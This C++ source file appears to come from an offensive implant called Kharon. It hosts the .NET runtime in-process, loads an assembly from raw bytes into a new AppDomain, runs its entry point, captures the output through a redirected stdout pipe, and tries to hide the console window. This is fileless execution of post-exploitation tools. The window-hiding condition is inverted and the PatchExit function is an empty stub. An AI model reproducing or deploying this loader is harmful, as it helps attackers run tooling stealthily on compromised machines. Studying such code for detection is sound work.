#include <Kharon.h>

using namespace mscorlib;

auto DECLFN Dotnet::Inline(
    _In_ PBYTE AsmBytes,
    _In_ ULONG AsmLength,
    _In_ PWSTR Arguments,
    _In_ PWSTR AppDomName,
    _In_ PWSTR Version,
    _In_ BOOL  KeepLoad
) -> BOOL {
    KhDbg( "assembly bytes at %p [%d bytes]", AsmBytes, AsmLength );
    KhDbg( "arguments %S", Arguments );
    KhDbg( "using app domain %S", AppDomName );
    KhDbg( "version: %S", Version );

    PWCHAR* AsmArgv   = {};
    ULONG   AsmArgc   = {};
    BOOL    Success   = FALSE;
    HANDLE  BackupOut = INVALID_HANDLE_VALUE;
    HANDLE  PipeWrite = INVALID_HANDLE_VALUE;
    HANDLE  PipeRead  = INVALID_HANDLE_VALUE;
    HWND    WinHandle = NULL;

    SAFEARRAYBOUND SafeBound = {};
    SAFEARRAY*     SafeAsm   = {};
    SAFEARRAY*     SafeExpc  = {};
    SAFEARRAY*	   SafeArgs  = {};

    BOOL             IsLoadable  = FALSE;
    HRESULT          HResult     = 0;
    VARIANT          VariantArgv = {};
    _Assembly*       Assembly    = {};
    _AppDomain*      AppDom      = {};
    _MethodInfo*     MethodInfo  = {};
    IUnknown*        AppDomThunk = {};
    IEnumUnknown*    EnumUkwn    = {};
    ICLRMetaHost*    MetaHost    = {};
    ICLRRuntimeInfo* RtmInfo     = {};
    ICorRuntimeHost* RtmHost     = {};

    LONG Idx = 0;

    SECURITY_ATTRIBUTES SecAttr = { 0 };

    HResult = Self->Mscoree.CLRCreateInstance( 
        Self->Dot->GUID.xCLSID_CLRMetaHost, Self->Dot->GUID.xIID_ICLRMetaHost, (PVOID*)&MetaHost 
    );
    if ( HResult ) goto _KH_END;

    HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
    if ( HResult ) goto _KH_END;

    HResult = MetaHost->GetRuntime( L"v4.0.30319", Self->Dot->GUID.xIID_ICLRRuntimeInfo, (PVOID*)&RtmInfo );
    if ( HResult ) goto _KH_END;

    HResult = RtmInfo->IsLoadable( &IsLoadable );
    KhDbg( "is loadable: %s", IsLoadable ? "true" : "false" );
    if ( HResult || !IsLoadable ) goto _KH_END;

    HResult = RtmInfo->GetInterface( 
        Self->Dot->GUID.xCLSID_CorRuntimeHost, Self->Dot->GUID.xIID_ICorRuntimeHost, (PVOID*)&RtmHost 
    );
    if ( HResult ) goto _KH_END;

    HResult = RtmHost->Start();
    if ( HResult ) goto _KH_END;

    HResult = RtmHost->CreateDomain( AppDomName, 0, &AppDomThunk );
    if ( HResult ) goto _KH_END;

    HResult = AppDomThunk->QueryInterface( Self->Dot->GUID.xIID_AppDomain, (PVOID*)&AppDom );
    if ( HResult ) goto _KH_END;

    SafeBound = { AsmLength, 0 };
    SafeAsm   = Self->Oleaut32.SafeArrayCreate( VT_UI1, 1, &SafeBound );

    Mem::Copy( SafeAsm->pvData, AsmBytes, AsmLength );

    HResult = AppDom->Load_3( SafeAsm, &Assembly );
    if ( HResult ) goto _KH_END;

    HResult = Assembly->get_EntryPoint( &MethodInfo );
    if ( HResult ) goto _KH_END;

    HResult = MethodInfo->GetParameters( &SafeExpc );
    if ( HResult ) goto _KH_END;
    
	if ( SafeExpc ) {
		if ( SafeExpc->cDims && SafeExpc->rgsabound[0].cElements ) {
			SafeArgs = Self->Oleaut32.SafeArrayCreateVector( VT_VARIANT, 0, 1 );

			if ( Arguments ) {
                if ( Str::LengthW( Arguments ) ) {
                    AsmArgv = Self->Shell32.CommandLineToArgvW( Arguments, (PINT)&AsmArgc );
                }
			}

			VariantArgv.parray = Self->Oleaut32.SafeArrayCreateVector(VT_BSTR, 0, AsmArgc);
			VariantArgv.vt     = (VT_ARRAY | VT_BSTR);

			for ( Idx = 0; Idx < AsmArgc; Idx++ ) {
				Self->Oleaut32.SafeArrayPutElement( VariantArgv.parray, &Idx, Self->Oleaut32.SysAllocString( AsmArgv[Idx] ) );
			}

			Idx = 0;
			Self->Oleaut32.SafeArrayPutElement( SafeArgs, &Idx, &VariantArgv );
			Self->Oleaut32.SafeArrayDestroy( VariantArgv.parray );
		}
	}

    SecAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };

    Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecAttr, PIPE_BUFFER_LENGTH );

    WinHandle = Self->Krnl32.GetConsoleWindow();

    if ( !WinHandle ) {
        Self->Krnl32.AllocConsole();

        if ( !( WinHandle = Self->Krnl32.GetConsoleWindow() ) ) {
            Self->User32.ShowWindow( WinHandle, SW_HIDE );
        }
    }

    BackupOut = Self->Krnl32.GetStdHandle( STD_OUTPUT_HANDLE );
    Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, PipeWrite );

    KhDbg( "invoking .NET assembly" );

    HResult = MethodInfo->Invoke_3( VARIANT(), SafeArgs, NULL );
    if ( HResult ) goto _KH_END;

    Self->Dot->Buffer.a = (PCHAR)Self->Hp->Alloc( PIPE_BUFFER_LENGTH );

    Success = Self->Krnl32.ReadFile( PipeRead, Self->Dot->Buffer.a, PIPE_BUFFER_LENGTH, &Self->Dot->Buffer.s, 0 );

    KhDbg( "dotnet asm output [%d bytes] %s", Self->Dot->Buffer.s, Self->Dot->Buffer.a );
_KH_END:
    if ( HResult ) {    
        LPSTR errorMessage = NULL;
        DWORD flags = 
            FORMAT_MESSAGE_ALLOCATE_BUFFER | 
            FORMAT_MESSAGE_FROM_SYSTEM | 
            FORMAT_MESSAGE_IGNORE_INSERTS;
    
        DWORD result = Self->Krnl32.FormatMessageA(
            flags, NULL, HResult,MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
            (LPSTR)&errorMessage, 0, NULL 
        );
    
        if ( result > 0 && errorMessage != NULL ) {
            KhDbg("Erro (HRESULT 0x%08X): %s\n", HResult, errorMessage);
        }
    
        if ( errorMessage != NULL ) {
            // Self->Hp->Free( errorMessage, Str::LengthA( errorMessage ) );
        }
    }

    if ( BackupOut ) Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, BackupOut );

    if ( AsmArgv ) {
        Self->Hp->Free( AsmArgv, Str::LengthW( *AsmArgv ) ); AsmArgv = NULL;
    }

    if ( SafeAsm ) {
        Self->Oleaut32.SafeArrayDestroy( SafeAsm ); SafeAsm = NULL;
    }

    if ( SafeArgs ) {
        Self->Oleaut32.SafeArrayDestroy( SafeArgs ); SafeArgs = NULL;
    }

    if ( MethodInfo ) {
        MethodInfo->Release();
    }

    if ( RtmInfo ) {
        RtmInfo->Release();
    }

    if ( RtmHost ) {
        RtmHost->Release();
    }

    return HResult;
}

auto Dotnet::PatchExit(
    _In_ ICorRuntimeHost* IRuntime
) -> HRESULT {
    
}